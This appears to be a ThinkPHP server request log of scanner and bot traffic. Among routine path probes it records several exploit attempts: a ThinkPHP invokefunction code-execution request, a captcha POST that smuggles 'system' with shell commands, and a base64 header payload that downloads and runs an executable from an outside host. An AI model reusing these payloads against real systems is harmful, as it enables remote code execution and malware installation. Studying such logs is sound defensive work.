[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001086s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001120s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'python-requests/2.22.0',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000877s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000330s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/TP/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.019308s] [åžåçŽ‡ï¼š51.79req/s] [å†…å­˜æ¶ˆè€—ï¼š333.20kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001153s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001187s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'TP',
    1 => 'public',
    2 => 'index.php',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000216s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/TP/index.php
[è¿è¡Œæ—¶é—´ï¼š0.012255s] [åžåçŽ‡ï¼š81.60req/s] [å†…å­˜æ¶ˆè€—ï¼š333.13kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000055s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000910s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000943s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'TP',
    1 => 'index.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000209s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/thinkphp/html/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.012954s] [åžåçŽ‡ï¼š77.20req/s] [å†…å­˜æ¶ˆè€—ï¼š333.20kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000053s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000973s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001005s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'thinkphp',
    1 => 'html',
    2 => 'public',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000210s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/html/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.012581s] [åžåçŽ‡ï¼š79.49req/s] [å†…å­˜æ¶ˆè€—ï¼š333.20kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000918s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000951s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'html',
    1 => 'public',
    2 => 'index.php',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.012399s] [åžåçŽ‡ï¼š80.65req/s] [å†…å­˜æ¶ˆè€—ï¼š333.16kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000052s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000931s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000963s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'index.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/TP/html/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.012581s] [åžåçŽ‡ï¼š79.48req/s] [å†…å­˜æ¶ˆè€—ï¼š333.16kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000077s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000922s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000954s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'TP',
    1 => 'html',
    2 => 'public',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000207s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/elrekt.php
[è¿è¡Œæ—¶é—´ï¼š0.013407s] [åžåçŽ‡ï¼š74.59req/s] [å†…å­˜æ¶ˆè€—ï¼š333.06kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001031s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001064s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'elrekt.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/index.php
[è¿è¡Œæ—¶é—´ï¼š0.018645s] [åžåçŽ‡ï¼š53.63req/s] [å†…å­˜æ¶ˆè€—ï¼š472.21kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000054s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000960s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000994s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000854s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000322s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000218s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[è¿è¡Œæ—¶é—´ï¼š0.010749s] [åžåçŽ‡ï¼š93.03req/s] [å†…å­˜æ¶ˆè€—ï¼š341.96kb] [æ–‡ä»¶åŠ è½½ï¼š118]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000055s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000676s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000709s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'phpinfo',
    1 => 
    array (
      0 => '1',
    ),
  ),
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000197s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 POST 114.115.146.220/index.php?s=captcha
[è¿è¡Œæ—¶é—´ï¼š0.009814s] [åžåçŽ‡ï¼š101.90req/s] [å†…å­˜æ¶ˆè€—ï¼š333.96kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000051s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000674s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000706s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'captcha',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Go-http-client/1.1',
  'content-length' => '84',
  'connection' => 'close',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
  'filter' => 
  array (
    0 => 'system',
  ),
  'method' => 'get',
  'server' => 
  array (
    'REQUEST_METHOD' => 'uname',
  ),
  'ipconfig' => '',
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000194s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T07:03:48+08:00 ] 49.232.13.96 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.014915s] [åžåçŽ‡ï¼š67.05req/s] [å†…å­˜æ¶ˆè€—ï¼š472.16kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000050s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000668s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000699s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000813s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000297s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000218s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T09:31:11+08:00 ] 80.82.70.187 GET www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif
[è¿è¡Œæ—¶é—´ï¼š0.021420s] [åžåçŽ‡ï¼š46.69req/s] [å†…å­˜æ¶ˆè€—ï¼š332.79kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001071s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001105s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000213s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T09:33:58+08:00 ] 177.95.215.214 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.025250s] [åžåçŽ‡ï¼š39.60req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001089s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001124s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000878s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000333s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000230s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T09:41:43+08:00 ] 103.113.106.18 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.025006s] [åžåçŽ‡ï¼š39.99req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001166s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001200s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000874s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000328s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000229s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T10:51:31+08:00 ] 5.190.97.233 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.023897s] [åžåçŽ‡ï¼š41.85req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001021s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001055s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000833s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000359s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000234s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T12:03:19+08:00 ] 201.69.50.136 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.036536s] [åžåçŽ‡ï¼š27.37req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000092s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001733s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001788s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001283s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000324s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T12:39:08+08:00 ] 47.94.136.241 GET 114.115.146.220/TP/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.023218s] [åžåçŽ‡ï¼š43.07req/s] [å†…å­˜æ¶ˆè€—ï¼š333.20kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001201s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001243s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'TP',
    1 => 'public',
    2 => 'index.php',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000237s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T13:40:12+08:00 ] 159.203.201.255 GET 114.115.146.220/manager/text/list
[è¿è¡Œæ—¶é—´ï¼š0.018677s] [åžåçŽ‡ï¼š53.54req/s] [å†…å­˜æ¶ˆè€—ï¼š332.84kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001018s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001052s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'text',
    2 => 'list',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000211s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T15:19:11+08:00 ] 116.62.174.255 GET 114.115.146.220/
[è¿è¡Œæ—¶é—´ï¼š0.026795s] [åžåçŽ‡ï¼š37.32req/s] [å†…å­˜æ¶ˆè€—ï¼š473.74kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001183s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001217s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZmsub3BlbnlvdXJhc3MuaWN1L2Rvd25sb2FkLmV4ZSAlU3lzdGVtUm9vdCUvVGVtcC92bG12d2tzbnZyc25pcXI0OC5leGUgJiAlU3lzdGVtUm9vdCUvVGVtcC92bG12d2tzbnZyc25pcXI0OC5leGUnKTtlY2hvIG1kNSgncGhwc3R1ZHknKTs=',
  'accept-encoding' => 'gzip,deflate',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000906s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000356s ]
